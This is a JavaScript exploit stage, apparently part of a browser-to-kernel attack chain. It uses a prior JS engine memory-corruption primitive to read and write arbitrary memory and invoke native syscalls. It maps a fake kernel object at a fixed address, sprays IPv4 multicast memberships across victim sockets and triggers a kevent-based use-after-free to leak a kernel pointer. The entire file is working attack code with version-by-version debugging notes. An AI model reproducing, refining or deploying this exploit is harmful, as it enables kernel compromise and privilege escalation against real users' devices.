// Stage D v5: arm -> detect -> join-through-fake -> walk.
//
// v2..v4 all assumed the join had to happen before the arm. The boot-1 log
// says otherwise: D v1's walk (group 251) failed at victim 41 with
// EADDRNOTAVAIL, i.e. the arm had ALREADY planted the fake imo on victim 41.
// Only then did D v2 join group 249, and that join is what wrote a membership
// entry into the fake page so the 249 walk could match.
//
// v4's real pass reproduced the same signature (`s72@0e49` = planted victim 0,
// empty fake membership list) but never followed up with a join, because its
// join ran before the arm. This probe does it in the order the kernel needs:
//
//   layout(page with group G) -> arm(data=0) -> detect (walk with the group
//   joined so far: the planted victim returns EADDRNOTAVAIL) -> join G
//   (through the planted fake imo, which populates the fake membership list)
//   -> walk G (the rb-tree insert writes fake+0x50).
//
// Up to three cycles with fresh groups 249, 248, 247. A cycle that detects no
// plant costs one blind write, so the probe stops as soon as a cycle passes.
var result, n, f, dv, saved, phase = "preflight";
var st = null, fake = 0, page = 0, mapped = 0;
var forged = null, carrier = null, carrierSlot = -1, carrierOriginal = null;
var MAPLEN = 16384;
try {
  n = window.__fw14NativeInvoke;
  var state = window.__fw14ArrayState;
  if (!n || !n.frame || !n.wrappers || !Number.isSafeInteger(n.frameAddress) ||
      !state || state.array[0] !== state.a || !state.view ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      !Number.isInteger(state.index))
    throw new Error("caller_missing");
  st = window.__fw14StageC;
  if (!st || typeof st.kq !== "number" || typeof st.dce !== "number" ||
      typeof st.targetFd !== "number" || !Array.isArray(st.victims) ||
      st.victims.length !== 96 || typeof st.anchor !== "number")
    throw new Error("stage_c_state_missing");
  var need = ["open", "close", "setsockopt", "getsockopt", "kevent", "getpid", "sys477"];
  var missing = [];
  for (var mi = 0; mi < need.length; mi++)
    if (typeof n.wrappers[need[mi]] !== "number") missing.push(need[mi]);
  if (missing.length) throw new Error("wrappers_missing:" + missing.join(","));
  f = n.frame;
  if (f.length < 0x9020) throw new Error("frame_short");
  dv = new DataView(f.buffer, f.byteOffset, f.byteLength);
  saved = Array.from(f.subarray(0x200, 0x1000));

  forged = state.view;
  carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  function bytesAt(index, count) {
    var out = [];
    for (var i = 0; i < count; i++) out.push(forged[index + i]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var i = bytes.length - 1; i >= 0; i--)
      value = value * 256 + bytes[i];
    return value;
  }
  function pointerBytes(value) {
    var out = [];
    for (var i = 0; i < 8; i++)
      out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  carrierOriginal = bytesAt(carrierSlot, 8);
  function setCarrier(addr) {
    var next = pointerBytes(addr);
    for (var i = 0; i < 8; i++) forged[carrierSlot + i] = next[i];
  }
  function restoreCarrier() {
    for (var i = 0; i < 8; i++)
      forged[carrierSlot + i] = carrierOriginal[i];
  }
  function poke(addr, bytes) {
    setCarrier(addr);
    for (var i = 0; i < bytes.length; i++) carrier[i] = bytes[i];
    restoreCarrier();
  }
  function peek(addr, count) {
    setCarrier(addr);
    var out = [];
    for (var i = 0; i < count; i++) out.push(carrier[i]);
    restoreCarrier();
    return out;
  }
  function peekLong(addr) { return valueOf(peek(addr, 8)); }
  function peekU32(addr) { return valueOf(peek(addr, 4)); }
  function pokeLong(addr, value) { poke(addr, pointerBytes(value)); }
  function pokeU32(addr, value) {
    poke(addr, [value & 255, (value >>> 8) & 255,
                (value >>> 16) & 255, (value >>> 24) & 255]);
  }
  function pokeU16(addr, value) {
    poke(addr, [value & 255, (value >>> 8) & 255]);
  }
  function isErr(r) {
    return !!r && r.value === -1 && (r.high >>> 0) === 0xffffffff;
  }
  function errnoOf(r) { return isErr(r) ? n.readErrno() : null; }
  function eTag(r) {
    if (!isErr(r)) return "v" + r.value;
    var e = n.readErrno();
    return "e" + (e === null ? r.value : e);
  }
  function mark(m) {
    if (typeof api !== "undefined" && api && typeof api.markSync === "function")
      api.markSync(m);
  }
  function hex8(v) { return ("00000000" + (v >>> 0).toString(16)).slice(-8); }
  function kptr(v) {
    return v !== 0 && Math.floor(v / 0x1000000000000) === 0xffff;
  }

  var pidRes = n.call("getpid", []);
  if (pidRes.high !== 0 || pidRes.value < 1 || pidRes.value > 100000)
    throw new Error("pid_invalid");
  var pid = pidRes.value;

  // ------------------------------------------------------- fake page
  phase = "mmap";
  mark("d5_mmap");
  fake = (((st.dce & 0xffff) << 16) | 0x9800) >>> 0;
  page = fake & 0xffffc000;
  mapped = n.call("sys477", [page, MAPLEN, 3, 0x1012, 0xffffffff, 0]);
  var mmapTag = "fake=0x" + hex8(fake) + "/page=0x" + hex8(page) +
    "/rc=" + (isErr(mapped) ? "e" + (errnoOf(mapped) === null ?
      mapped.value : errnoOf(mapped)) : "0x" + hex8(mapped.value));
  if (isErr(mapped) || mapped.value !== page)
    throw new Error("mmap_fixed_" + mmapTag);

  function layout(groupU32) {
    poke(page, new Uint8Array(MAPLEN));
    pokeU32(fake + 16, groupU32 >>> 0);
    pokeLong(fake + 24, fake + 512);
    pokeU32(fake + 640, 8);
    pokeLong(fake + 32, fake + 768);
    pokeLong(fake + 800, fake + 1024);
    pokeLong(fake + 1880, fake + 2048);
    pokeLong(fake + 2056, fake + 2304);
    pokeU32(fake + 56, 2);
    pokeLong(fake + 80, 0);
    pokeLong(fake + 88, 0);
    pokeU16(fake + 180, 2);
    pokeU16(fake + 190, 2);
  }

  // ------------------------------------------------------- payloads
  f.fill(0, 0x600, 0x740);
  function groupPayload(off, group) {
    f[off] = 0xef; f[off + 1] = 0xff;
    f[off + 2] = 0xff; f[off + 3] = group & 0xff;
  }
  function blockPayload(off, group, srcByte) {
    f[off] = 0xef; f[off + 1] = 0xff;
    f[off + 2] = 0xff; f[off + 3] = group & 0xff;
    f[off + 4] = 0xc0; f[off + 5] = 0x00;
    f[off + 6] = 0x02; f[off + 7] = srcByte & 0xff;
  }
  groupPayload(0x600, 0xfa);   // 239.255.255.250  (anchor + victims)
  groupPayload(0x620, 0xfb);   // 239.255.255.251  (anchor + victims)
  groupPayload(0x660, 0xf9);   // 239.255.255.249  cycle 1 join
  groupPayload(0x6a0, 0xf8);   // 239.255.255.248  cycle 2 join
  groupPayload(0x6e0, 0xf7);   // 239.255.255.247  cycle 3 join
  blockPayload(0x640, 0xfb, 1); // detect walk: group 251
  blockPayload(0x680, 0xf9, 1); // hit walk:   group 249
  blockPayload(0x6c0, 0xf8, 2); // hit walk:   group 248
  blockPayload(0x700, 0xf7, 3); // hit walk:   group 247

  function join(fd, off, tolerate) {
    var r = n.call("setsockopt", [fd, 0, 12, n.frameAddress + off, 8, 0]);
    if (r.value === 0) return 0;
    var e = errnoOf(r);
    if (tolerate && e === tolerate) return 0;
    return e === null ? r.value : e;
  }
  function joinPass(off, tolerate) {
    var fail = "";
    var e = join(st.anchor, off, tolerate);
    if (e) fail = "a" + e;
    var ok = 0;
    for (var vi = 0; vi < st.victims.length && !fail; vi++) {
      e = join(st.victims[vi], off, tolerate);
      if (e) { fail = "j" + vi + "e" + e; break; }
      ok++;
    }
    return { ok: ok, fail: fail };
  }
  function freeTarget() {
    return eTag(n.call("setsockopt", [st.targetFd, 41, 51, 0, 0, 0]));
  }
  function arm(data) {
    f.fill(0, 0x900, 0x940);
    dv.setUint32(0x900, st.dce >>> 0, true);
    dv.setUint32(0x904, 0, true);
    dv.setInt16(0x908, -18, true);
    dv.setUint16(0x90a, 1, true);
    dv.setInt32(0x910, data, true);
    dv.setInt32(0x914, 0, true);
    return n.call("kevent", [st.kq, n.frameAddress + 0x900, 1, 0, 0, 0]);
  }

  // A walk that only looks for the planted victim: it records the first
  // nonzero return and never treats a zero root as a hit.
  function detect(blockOff) {
    var errIdx = -1, err = 0, found = -1, kva = 0, count = 0;
    for (var wi = 0; wi < st.victims.length; wi++) {
      var g = n.call("setsockopt",
        [st.victims[wi], 0, 72, n.frameAddress + blockOff, 12, 0]);
      if (g.value !== 0 && errIdx < 0) {
        errIdx = wi;
        var e = errnoOf(g);
        err = e === null ? g.value : e;
      }
      var root = peekLong(fake + 80);
      if (kptr(root)) { found = wi; kva = root; count = peekLong(fake + 88); break; }
    }
    return { errIdx: errIdx, err: err, found: found, kva: kva, count: count };
  }

  // A walk that reports the first error plus the first canonical root.
  function hit(blockOff) {
    var errIdx = -1, err = 0, found = -1, kva = 0, count = 0, refMut = -1;
    for (var wi = 0; wi < st.victims.length; wi++) {
      var g = n.call("setsockopt",
        [st.victims[wi], 0, 72, n.frameAddress + blockOff, 12, 0]);
      if (g.value !== 0 && errIdx < 0) {
        errIdx = wi;
        var e = errnoOf(g);
        err = e === null ? g.value : e;
      }
      var root = peekLong(fake + 80);
      var ref = peekU32(fake + 56);
      if (ref !== 2) { refMut = wi; break; }
      if (kptr(root)) { found = wi; kva = root; count = peekLong(fake + 88); break; }
      if (root !== 0) break;
    }
    return { errIdx: errIdx, err: err, found: found, kva: kva,
             count: count, refMut: refMut };
  }

  // ------------------------------------------------- base membership set
  phase = "join_base";
  mark("d5_join_base");
  var j250 = joinPass(0x600, 48);
  if (j250.fail) throw new Error("join250_" + j250.fail);
  var j251 = joinPass(0x620, 48);
  if (j251.fail) throw new Error("join251_" + j251.fail);
  var freeTag = freeTarget();

  // ------------------------------------------------------------ cycles
  var cycles = [];
  var found = -1, kva = 0, count = 0;
  var plan = [
    { joinOff: 0x660, group: 0xf9, detectOff: 0x640, hitOff: 0x680 },
    { joinOff: 0x6a0, group: 0xf8, detectOff: 0x680, hitOff: 0x6c0 },
    { joinOff: 0x6e0, group: 0xf7, detectOff: 0x6c0, hitOff: 0x700 }
  ];
  for (var ci = 0; ci < plan.length && found < 0; ci++) {
    var p = plan[ci];
    phase = "cycle_" + (ci + 1);
    mark("d5_cycle_" + (ci + 1));
    layout(0xf9ffff00 | p.group);
    if (ci > 0) freeTarget();
    var a = arm(0);
    var aTag = eTag(a);
    var d = detect(p.detectOff);
    var cTag = "a" + aTag + "/d" + (d.errIdx >= 0 ?
      d.errIdx + "e" + d.err : "0");
    if (d.found >= 0) {
      found = d.found; kva = d.kva; count = d.count;
      cycles.push(cTag + "/direct");
      break;
    }
    if (d.errIdx >= 0) {
      // Planted. Join the fresh group through the fake imo so the fake
      // membership list gets an entry, then walk it.
      var jg = joinPass(p.joinOff, 48);
      cTag += "/j" + jg.ok + (jg.fail ? jg.fail : "");
      if (!jg.fail) {
        var h = hit(p.hitOff);
        cTag += "/h" + (h.found >= 0 ? "HIT" : (h.errIdx >= 0 ?
          h.errIdx + "e" + h.err : "0"));
        if (h.found >= 0) { found = h.found; kva = h.kva; count = h.count; }
      }
      cycles.push(cTag);
      break;                       // a planted cycle is not repeatable
    }
    cycles.push(cTag + "/noplant");
  }

  // ---------------------------------------------------------- outcome
  phase = "outcome";
  for (var ri = 0; ri < saved.length; ri++) f[0x200 + ri] = saved[ri];
  saved = null;
  var post = n.call("getpid", []);
  var intact = post.value === pid && post.high === 0 &&
    state.array[0] === state.a &&
    bytesAt(carrierSlot, 8).join(",") === carrierOriginal.join(",");

  var leakTag = found >= 0 ?
    ("v" + found + "/fd" + st.victims[found] + "/kva=0x" + hex8(kva) +
     "/n=" + count) : "none";

  if (found >= 0) {
    window.__fw14StageD = {
      fake: fake,
      page: page,
      victimIndex: found,
      victimFd: st.victims[found],
      kva: kva,
      count: count,
      kq: st.kq,
      dce: st.dce,
      targetFd: st.targetFd,
      spray: st.spray.slice(),
      victims: st.victims.slice(),
      anchor: st.anchor,
      pid: pid
    };
  }
  result = {
    id: "stage_d_fake_v5",
    status: found >= 0 ? (intact ? "pass" : "fail") : "fail",
    details: {
      pid: pid,
      mmap: mmapTag,
      base: "j" + j250.ok + "/" + j251.ok + "/f" + freeTag,
      cycles: cycles.join(";").slice(0, 480),
      leak: leakTag,
      state: found >= 0 ? "held" : "failed",
      intact: intact
    }
  };
} catch (e) {
  result = {
    id: "stage_d_fake_v5",
    status: "error",
    details: { phase: phase, error: String(e).slice(0, 220) }
  };
} finally {
  try { if (forged && carrierSlot >= 0 && carrierOriginal)
    for (var ci2 = 0; ci2 < 8; ci2++)
      forged[carrierSlot + ci2] = carrierOriginal[ci2]; } catch (ignore) {}
  if (f && saved)
    for (var fi = 0; fi < saved.length; fi++) f[0x200 + fi] = saved[fi];
}
return [result];
